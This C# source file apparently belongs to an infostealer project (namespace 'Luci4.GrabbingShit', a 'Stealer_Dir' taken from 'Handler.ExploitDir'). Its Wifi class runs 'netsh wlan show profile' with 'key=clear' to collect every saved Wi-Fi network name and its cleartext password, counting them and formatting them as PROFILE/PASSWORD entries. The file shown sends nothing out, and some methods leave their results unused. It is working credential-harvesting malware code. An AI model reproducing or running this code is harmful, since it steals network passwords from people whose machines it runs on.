using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Luci4.GrabbingShit
{
    internal sealed class Wifi
    {
        public static string[] GetProfiles()
        {
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
            string[] wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < wNames.Length; i++)
                wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
            return wNames;
        }

        public static string GetWifiPassword(string profile)
        {
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key");
            return output.Split(':').Last().Trim();
        }

        public static void ScanningNetworks()
        {
            string Stealer_Dir = Handler.ExploitDir;
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");

        }

        public static void SavedNetworks()
        {
            string Stealer_Dir = Handler.ExploitDir;
            string[] profiles = GetProfiles();
            foreach (string profile in profiles)
            {
                if (profile.Equals("65001"))
                    continue;

                Counter.SavedWifiNetworks++;
                string pwd = GetWifiPassword(profile);
                string fmt = "PROFILE: " + profile + "\nPASSWORD: " + pwd + "\n\n";

            }
        }

    }

}
